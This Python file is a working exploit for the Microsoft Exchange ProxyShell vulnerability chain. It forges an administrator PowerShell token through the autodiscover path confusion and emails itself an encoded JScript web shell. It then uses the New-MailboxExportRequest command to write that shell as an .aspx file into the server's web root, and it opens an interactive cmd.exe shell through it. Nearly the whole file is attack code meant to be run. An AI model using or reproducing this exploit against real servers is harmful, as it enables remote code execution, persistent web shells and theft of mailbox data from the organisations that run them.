import requests
import argparse
import sys
import struct
import base64
import string
import random
import time
import binascii
from pypsrp.powershell import PowerShell, RunspacePool
from pypsrp.wsman import WSMan
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
from colorama import Fore, Back, Style

class ProxyShell:

    def __init__(self, target, email, verify=False):
        self.target = target
        self.email = email
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0)"

    # Get legacyDN
    def get_legacyDN(self):
        legacyDN = ""
        mailboxId = ""
        autoDiscover_body = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
            <Request>
            <EMailAddress>%s</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
            </Request>
        </Autodiscover>
        """ % self.email

        rq = requests.post("https://%s/autodiscover/autodiscover.json?a=test@test.fpt/autodiscover/autodiscover.xml" % self.target, headers={
                           "Cookie": "Email=autodiscover/autodiscover.json?a=test@test.fpt", "Content-Type": "text/xml", "User-Agent": self.user_agent}, data=autoDiscover_body, verify=False)

        if rq.status_code != 200 and b"<LegacyDN>" not in rq.content:
            print(Fore.RED,"Autodiscover error or Can not get legacyDN")
            exit()
        content = str(rq.content)
        legacyDN = content.split("<LegacyDN>")[1].split("</LegacyDN>")[0]
        print(Fore.GREEN,"[+] LegacyDN: " + legacyDN)

        return legacyDN

    # Get SID
    def get_SId(self, legacyDN):
        SId = ""
        mapi_body = legacyDN + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"

        rq = requests.post("https://%s/autodiscover/autodiscover.json?a=test@test.fpt/mapi/emsmdb" % self.target, headers={"Cookie": "Email=autodiscover/autodiscover.json?a=test@test.fpt",
                                                                                                                           "Content-Type": "application/mapi-http",
                                                                                                                           "User-Agent": self.user_agent,
                                                                                                                           "X-Requesttype": "Connect",
                                                                                                                           "X-Requestid": "{C715155F-2BE8-44E0-BD34-2960067874C8}:2",
                                                                                                                           "X-Clientapplication": "Outlook/15.0.4815.1002"},
                           data=mapi_body, verify=False)

        if rq.status_code != 200 or b"act as owner of a UserMailbox" not in rq.content:
            print(Fore.RED,"[-] Mapi Error!")
            exit()
        content = str(rq.content)
        SId = content.split("with SID ")[1].split(" and MasterAccountSid")[0]
        if SId.rsplit("-", 1)[1] == '500':
            print(Fore.GREEN,"[+] Administrator SID: " + SId)
        if SId.rsplit("-", 1)[1] != '500':
            print(Fore.GREEN,"[+] User SID: " + SId)
            SId = SId.rsplit("-", 1)[0] + '-500'
            print(Fore.GREEN,"[+] Administrator SID: " + SId)

        return SId

    # Create token of X-Rps-CAT
    def get_token(self, SId):
        # From: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
        version = 0
        ttype = 'Windows'
        compressed = 0
        auth_type = 'Kerberos'
        raw_token = b''
        gsid = 'S-1-5-32-544'

        version_data = b'V' + (1).to_bytes(1, 'little') + (version).to_bytes(1, 'little')
        type_data = b'T' + (len(ttype)).to_bytes(1, 'little') + ttype.encode()
        compress_data = b'C' + (compressed).to_bytes(1, 'little')
        auth_data = b'A' + (len(auth_type)).to_bytes(1, 'little') + auth_type.encode()
        login_data = b'L' + (len(self.email)).to_bytes(1, 'little') + self.email.encode()
        user_data = b'U' + (len(SId)).to_bytes(1, 'little') + SId.encode()
        group_data = b'G' + struct.pack('<II', 1, 7) + (len(gsid)).to_bytes(1, 'little') + gsid.encode()
        ext_data = b'E' + struct.pack('>I', 0)

        raw_token += version_data
        raw_token += type_data
        raw_token += compress_data
        raw_token += auth_data
        raw_token += login_data
        raw_token += user_data
        raw_token += group_data
        raw_token += ext_data

        data = base64.b64encode(raw_token).decode()

        return data

    ### Check token X-Rps-CAT is valid or invalid 
    def check_valid_token(self, token):
        print(Fore.YELLOW,"[-] Check if token is valid or not")
        rp = requests.get("https://%s/autodiscover/autodiscover.json?a=test@test.fpt/powershell/?X-Rps-CAT=%s" % (self.target, token), headers={"Cookie": "Email=autodiscover/autodiscover.json?a=test@test.fpt", "Content-Type": "application/soap+xml;charset=UTF-8",
                                                                                                                                                "User-Agent": self.user_agent}, verify=False)
        if rp.status_code == 200:
            print(Fore.GREEN,"[+] Token is valid")
            return
        print(Fore.RED,"[x] Token is not valid, need more debugging")
        sys.exit(1)

    ### Send email contain malicious payload to email of exchange.
    def send_email_contains_malicious_payload(self, SId, token):
        # Trying to find the way to encode the right payload in python ...
        encoded_payload = encode_payload()
        subject_id = rand_subject(16)
        email = self.email
        print(
            Fore.YELLOW,f"[-] Sending email contains payload with subject id: {subject_id}")
        email_body = """
                <soap:Envelope
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
            xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
            xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
            <soap:Header>
                <t:RequestServerVersion Version="Exchange2016" />
                <t:SerializedSecurityContext>
                <t:UserSid>%s</t:UserSid>
                <t:GroupSids>
                    <t:GroupIdentifier>
                    <t:SecurityIdentifier>S-1-5-21</t:SecurityIdentifier>
                    </t:GroupIdentifier>
                </t:GroupSids>
                </t:SerializedSecurityContext>
            </soap:Header>
            <soap:Body>
                <m:CreateItem MessageDisposition="SaveOnly">
                <m:Items>
                    <t:Message>
                    <t:Subject>%s</t:Subject>
                    <t:Body BodyType="HTML">hello from darkness side</t:Body>
                    <t:Attachments>
                        <t:FileAttachment>
                        <t:Name>FileAttachment.txt</t:Name>
                        <t:IsInline>false</t:IsInline>
                        <t:IsContactPhoto>false</t:IsContactPhoto>
                        <t:Content>%s</t:Content>
                        </t:FileAttachment>
                    </t:Attachments>
                    <t:ToRecipients>
                        <t:Mailbox>
                        <t:EmailAddress>%s</t:EmailAddress>
                        </t:Mailbox>
                    </t:ToRecipients>
                    </t:Message>
                </m:Items>
                </m:CreateItem>
            </soap:Body>
            </soap:Envelope>
                """ % (SId, subject_id, encoded_payload, email)

        rq = requests.post("https://%s/autodiscover/autodiscover.json?a=test@test.fpt/EWS/exchange.asmx?X-Rps-CAT=%s" % (self.target, token), headers={
                           "Cookie": "Email=autodiscover/autodiscover.json?a=test@test.fpt", "Content-Type": "text/xml", "User-Agent": self.user_agent}, data=email_body, verify=False)
        if rq.status_code == 200:
            print(Fore.GREEN,f"[+] Sent email successfully with subject id: {subject_id}")

        return subject_id


    def shell(self, target, SId, token, port):
        # Credits: https://github.com/ktecv2000/ProxyShell/blob/main/exploit.py
        wsman = WSMan(server=target, port=443,
                      path='/autodiscover/autodiscover.json?@fucky0u.edu/Powershell?X-Rps-CAT=' +
                      token + '&Email=autodiscover/autodiscover.json%3F@fucky0u.edu',
                      ssl="true",
                      cert_validation=False)
        with RunspacePool(wsman, configuration_name="Microsoft.Exchange") as pool:
                proxyShell = ProxyShell(target, self.email)
                subject_id = proxyShell.send_email_contains_malicious_payload(
                    SId, token)
                assign_permission_command = "New-ManagementRoleAssignment -Role \"Mailbox Import Export\" -User %s" % self.email
                print(Fore.YELLOW,"[-] Executing command: ", assign_permission_command)
                ps = PowerShell(pool)
                ps.add_script(assign_permission_command)
                output_1 = ps.invoke()
                print(Fore.GREEN,"OUTPUT:\n%s" % "\n".join([str(s) for s in output_1]))
                print(Fore.RED,"ERROR:\n%s" % "\n".join([str(s) for s in ps.streams.error]))

                cleanup_export_command = "Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest -Confirm:$false"
                print(Fore.YELLOW,"[-] Executing command: ", cleanup_export_command)
                ps = PowerShell(pool)
                ps.add_script(cleanup_export_command)
                output_2 = ps.invoke()
                print(Fore.GREEN,"OUTPUT:\n%s" % "\n".join([str(s) for s in output_2]))
                print(Fore.RED,"ERROR:\n%s" % "\n".join([str(s) for s in ps.streams.error]))

                file_path = "\\\\localhost\\c$\\inetpub\\wwwroot\\aspnet_client\\%s.aspx" % subject_id
                write_fie_command = """New-MailboxExportRequest -Mailbox %s -IncludeFolders "#Drafts#" -FilePath "%s" -ContentFilter "Subject -eq '%s'" """ % (
                    self.email, file_path, subject_id)
                print(Fore.YELLOW,"[-] Executing command: ", write_fie_command)
                ps = PowerShell(pool)
                ps.add_script(write_fie_command)
                output_3 = ps.invoke()
                print(Fore.GREEN,"OUTPUT:\n%s" % "\n".join([str(s) for s in output_3]))
                print(Fore.RED,"ERROR:\n%s" % "\n".join([str(s) for s in ps.streams.error]))

                shell_url = 'https://%s/aspnet_client/%s.aspx' % (
                    target, subject_id)
                print('Shell URL: %s' % shell_url)
                # Credits: https://github.com/dmaasland/proxyshell-poc/blob/main/proxyshell_rce.py#L238
                for i in range(10):
                    print(f'Testing shell {i}')
                    r = requests.get(shell_url, verify=False)
                    if r.status_code == 200:
                        delimit = rand_subject()

                        while True:
                            cmd = input('Shell> ')
                            if cmd.lower() in ['exit', 'quit']:
                                return

                            exec_code = 'Response.Write("%s" + new ActiveXObject("WScript.Shell").Exec("cmd.exe /c %s").StdOut.ReadAll() + "%s");' % (
                                delimit, cmd, delimit)
                            r = requests.get(
                                shell_url,
                                params={
                                    'cmd': exec_code
                                },
                                verify=False
                            )
                            output = r.content.split(delimit.encode())[1]
                            print(output.decode())

                    time.sleep(5)
                    i += 1

                print(Fore.RED,'Shell drop failed :(')
                return


def encode_payload():
    # Credits: https://github.com/ktecv2000/ProxyShell/blob/main/exploit.py#L175
    payload = "<script language='JScript' runat='server' Page aspcompat=true>function Page_Load(){eval(Request['cmd'],'unsafe');}</script>"
    compEnc = [0x47, 0xf1, 0xb4, 0xe6, 0x0b, 0x6a, 0x72, 0x48, 0x85, 0x4e, 0x9e, 0xeb, 0xe2, 0xf8, 0x94,
               0x53, 0xe0, 0xbb, 0xa0, 0x02, 0xe8, 0x5a, 0x09, 0xab, 0xdb, 0xe3, 0xba, 0xc6, 0x7c, 0xc3, 0x10, 0xdd, 0x39,
               0x05, 0x96, 0x30, 0xf5, 0x37, 0x60, 0x82, 0x8c, 0xc9, 0x13, 0x4a, 0x6b, 0x1d, 0xf3, 0xfb, 0x8f, 0x26, 0x97,
               0xca, 0x91, 0x17, 0x01, 0xc4, 0x32, 0x2d, 0x6e, 0x31, 0x95, 0xff, 0xd9, 0x23, 0xd1, 0x00, 0x5e, 0x79, 0xdc,
               0x44, 0x3b, 0x1a, 0x28, 0xc5, 0x61, 0x57, 0x20, 0x90, 0x3d, 0x83, 0xb9, 0x43, 0xbe, 0x67, 0xd2, 0x46, 0x42,
               0x76, 0xc0, 0x6d, 0x5b, 0x7e, 0xb2, 0x0f, 0x16, 0x29, 0x3c, 0xa9, 0x03, 0x54, 0x0d, 0xda, 0x5d, 0xdf, 0xf6,
               0xb7, 0xc7, 0x62, 0xcd, 0x8d, 0x06, 0xd3, 0x69, 0x5c, 0x86, 0xd6, 0x14, 0xf7, 0xa5, 0x66, 0x75, 0xac, 0xb1,
               0xe9, 0x45, 0x21, 0x70, 0x0c, 0x87, 0x9f, 0x74, 0xa4, 0x22, 0x4c, 0x6f, 0xbf, 0x1f, 0x56, 0xaa, 0x2e, 0xb3,
               0x78, 0x33, 0x50, 0xb0, 0xa3, 0x92, 0xbc, 0xcf, 0x19, 0x1c, 0xa7, 0x63, 0xcb, 0x1e, 0x4d, 0x3e, 0x4b, 0x1b,
               0x9b, 0x4f, 0xe7, 0xf0, 0xee, 0xad, 0x3a, 0xb5, 0x59, 0x04, 0xea, 0x40, 0x55, 0x25, 0x51, 0xe5, 0x7a, 0x89,
               0x38, 0x68, 0x52, 0x7b, 0xfc, 0x27, 0xae, 0xd7, 0xbd, 0xfa, 0x07, 0xf4, 0xcc, 0x8e, 0x5f, 0xef, 0x35, 0x9c,
               0x84, 0x2b, 0x15, 0xd5, 0x77, 0x34, 0x49, 0xb6, 0x12, 0x0a, 0x7f, 0x71, 0x88, 0xfd, 0x9d, 0x18, 0x41, 0x7d,
               0x93, 0xd8, 0x58, 0x2c, 0xce, 0xfe, 0x24, 0xaf, 0xde, 0xb8, 0x36, 0xc8, 0xa1, 0x80, 0xa6, 0x99, 0x98, 0xa8,
               0x2f, 0x0e, 0x81, 0x65, 0x73, 0xe4, 0xc2, 0xa2, 0x8a, 0xd4, 0xe1, 0x11, 0xd0, 0x08, 0x8b, 0x2a, 0xf2, 0xed,
               0x9a, 0x64, 0x3f, 0xc1, 0x6c, 0xf9, 0xec]

    out = [None]*len(payload)
    for i in range(len(payload)):
        temp = ord(payload[i]) & 0xff
        out[i] = "%02x" % (compEnc[temp])
    out = ''.join(out)
    return base64.b64encode(binascii.unhexlify(out)).decode()


def rand_subject(n=6):
    return ''.join(random.choices(string.ascii_lowercase, k=n))


# def main():
#     parser = argparse.ArgumentParser()
#     parser.add_argument('--target', help='the target Exchange Server ip')
#     parser.add_argument('--email', help='victim email')
#     args = parser.parse_args()

#     target = args.target
#     email = args.email

#     # target = "192.168.29.250"
#     # email = "administrator@fpt.edu.vn"
#     user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0)"

#     proxyShell = ProxyShell(target, email)
#     legacyDN = proxyShell.get_legacyDN()
#     SId = proxyShell.get_SId(legacyDN)
#     token = proxyShell.get_token(SId)
#     print("token: ", token)
#     proxyShell.check_valid_token(token)
#     proxyShell.shell(target, SId, token, 8000)


# if __name__ == '__main__':
#     main()
